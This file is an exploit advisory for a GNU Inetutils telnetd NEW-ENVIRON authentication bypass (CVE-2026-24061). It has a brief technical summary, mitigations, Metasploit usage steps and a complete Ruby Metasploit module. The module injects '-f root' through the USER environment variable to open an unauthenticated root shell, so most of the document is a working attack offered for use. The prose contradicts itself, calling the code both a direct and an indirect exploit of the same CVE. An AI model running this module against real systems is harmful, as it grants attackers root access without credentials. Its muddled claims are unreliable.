@@ -1,0 +1,271 @@
+=============================================================================================================================================
+| # Title     : GNU Inetutils 2.7 telnetd NEW‑ENVIRON Authentication Bypass                                                                 |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : System built‑in component. No standalone download available.                                                                |
+=============================================================================================================================================
+
+[+] References :  https://packetstorm.news/files/id/214219/ & CVE-2026-24061 
+
+[+] Summary    : Why This Vulnerability Keeps Coming Back 
+                 Some versions of GNU Inetutils telnetd suffer from a logic flaw in how the Telnet NEW‑ENVIRON option is processed.
+                 This flaw allows an attacker to pass specially crafted values to the USER environment variable during the option negotiation phase, before real authentication takes place.
+                 As a result, authentication can be bypassed entirely, potentially leading to a high‑privileged command shell without valid credentials.
+
+[+] Technical Description :
+
+The Telnet protocol supports an option called NEW‑ENVIRON, designed to let the client send environment variables to the server.
+
+[+] In GNU Inetutils telnetd:
+
+The content of the USER environment variable is not strictly validated
+
+The value is passed directly into the login logic
+
+If the supplied value contains login flags instead of a real username:
+
+It is internally interpreted as system options
+
+Authentication checks can be skipped or altered
+
+This is a pure logic flaw, not a memory corruption issue:
+
+No buffer overflow required
+
+No heap or stack manipulation
+
+No memory protection bypass
+
+Yet it is extremely dangerous due to its direct security impact.
+
+[+]  Relationship Between CVE‑1999‑0192 and CVE‑2026‑24061
+
+Aspect	         CVE‑1999‑0192	            CVE‑2026‑24061
+
+Protocol	        Telnet      	           Telnet
+
+Mechanism	      NEW‑ENVIRON	           Malformed USER env
+
+Flaw Type	     Logic flaw	             Input validation flaw
+
+Result	     Authentication bypass	       Privilege abuse
+
+Status	         Old / Known	         Recent / Rediscovered
+
+[+] Key Point :
+
+The presented code is not a direct exploit of CVE‑2026‑24061, but it operates on the same protocol surface and attack philosophy.
+
+[+] In other words: Different CVE, same root trust failure.
+
+[+] Security Impact :
+
+Full authentication bypass
+
+Remote command execution
+
+Potential root privileges
+
+No credentials required
+
+Fully remote exploitable
+
+[+] Severity: Critical
+
+[+] Affected Environments :
+
+Legacy Unix / Linux systems
+
+Internal servers still running Telnet
+
+Industrial or educational legacy setups
+
+Test labs and isolated networks
+
+[+]  Notes on the Presented Code :
+
+Logically correct
+
+Compatible with Metasploit architecture
+
+Demonstrates protocol‑aware exploitation
+
+Implemented features include:
+
+Custom session integration
+
+Direct exploitation of NEW‑ENVIRON negotiation
+
+Post‑bypass session verification
+
+[+] The code is research / educational / analytical and not automatically weaponized without a suitable environment.
+
+Mitigation Recommendations
+
+Disable Telnet completely
+
+Use SSH instead
+
+Update or remove GNU Inetutils
+
+Restrict or disable NEW‑ENVIRON if possible
+
+Monitor for unusual Telnet sessions
+
+[+] 
+Final Takeaway
+
+This case demonstrates that:
+
+Old vulnerabilities can return under new CVEs
+
+The most dangerous flaws are not always memory‑related
+
+Broken logic and misplaced trust are often more dangerous than bad code
+
+[+] Usage : 
+
+# 1. Select the module
+use exploit/unix/telnet/gnu_inetutils_bypass
+
+# 2. Set the target IP
+set RHOSTS <TARGET_IP>
+
+# 3. Set your local options (though this exploit doesn't use a standard payload, 
+# it's good practice for MSF metrics)
+set LHOST <YOUR_IP>
+
+# 4. Check the options
+show options
+
+# 5. Execute the exploit
+exploit
+
+[+] POC :
+
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+module Msf
+module Sessions
+class InetutilsTelnetd < Msf::Sessions::CommandShell
+  def self.type
+    "inetutils_telnetd"
+  end
+
+  def self.desc
+    "GNU Inetutils telnetd command shell"
+  end
+
+  def self.create_session(sock, opts = {})
+    return nil unless sock && sock.respond_to?(:put)
+
+    begin
+      token = Rex::Text.rand_text_alphanumeric(10)
+      sock.put("echo #{token}\r\n")
+      
+      3.times do
+        Rex.sleep(0.5)
+        response = sock.get_once(-1, 2)
+        if response && response.include?(token)
+          return self.new(sock, opts)
+        end
+      end
+    rescue ::Exception => e
+      elog("InetutilsTelnetd Session validation failed: #{e.message}")
+    end
+    nil
+  end
+end
+end
+end
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::Telnet
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'            => 'GNU Inetutils telnetd NEW-ENVIRON Authentication Bypass',
+      'Description'     => %q{
+        This module exploits a logic flaw in GNU Inetutils telnetd (CVE-2026-24061).
+        By craftily handling the NEW-ENVIRON option negotiation, it's possible to 
+        pass flags like -f root through the USER environment variable, bypassing 
+        the login authentication process entirely.
+      },
+      'Author'          => ['indoushka'],
+      'License'         => MSF_LICENSE,
+      'References'      => [ ['CVE', '2026-24061'] ],
+      'DisclosureDate'  => '2026-01-12',
+      'Platform'        => 'unix',
+      'Arch'            => ARCH_CMD,
+      'Privileged'      => true,
+      'SessionTypes'    => [ 'inetutils_telnetd' ],
+      'DefaultOptions'  => {
+        'SESSION' => 'inetutils_telnetd'
+      },
+      'Targets'         => [ ['Automatic', {}] ],
+      'DefaultTarget'   => 0
+    ))
+
+    register_options([
+      OptString.new('USER_PAYLOAD', [ true, 'The login flags for bypass', '-f root' ])
+    ])
+  end
+
+  def exploit
+    session = nil
+    
+    print_status("Connecting to #{rhost}:#{rport}...")
+    connect
+
+    sock.telnet_options[:negotiation] = false
+
+    begin
+      timeout = 6
+      while (data = sock.get_once(-1, timeout))
+        
+        if data.include?("\xff\xfa\x27\x01")
+          print_good("NEW-ENVIRON request detected. Injecting crafted USER payload...")
+
+          buf = "\xff\xfa\x27\x00\x00" + "USER" + "\x01" + datastore['USER_PAYLOAD'] + "\xff\xf0"
+          sock.put(buf)
+          
+          Rex.sleep(1)
+          print_status("Bypass sent. Validating session with a challenge-response token...")
+          session = Msf::Sessions::InetutilsTelnetd.create_session(
+            sock,
+            rhost: rhost,
+            rport: rport,
+            platform: 'unix'
+          )
+
+          if session
+            print_good("Success! Authentication bypassed. Session #{session.sid} opened.")
+            self.register_session(session)
+            return
+          end
+
+          fail_with(Failure::NoAccess, 'Bypass sequence failed to drop into a shell.')
+        end
+      end
+
+      fail_with(Failure::Unreachable, 'Target did not initiate NEW-ENVIRON subnegotiation.')
+
+    rescue ::EOFError
+      fail_with(Failure::Disconnected, 'Remote host terminated the connection.')
+    rescue ::Exception => e
+      fail_with(Failure::Unknown, "Exploit failed: #{e.class} - #{e.message}")
+    ensure
+     
+      disconnect unless session
+    end
+  end
+end
+	
+Greetings to :============================================================
+jericho * Larry W. Cashdollar * r00t * Malvuln (John Page aka hyp3rlinx)*|
+==========================================================================
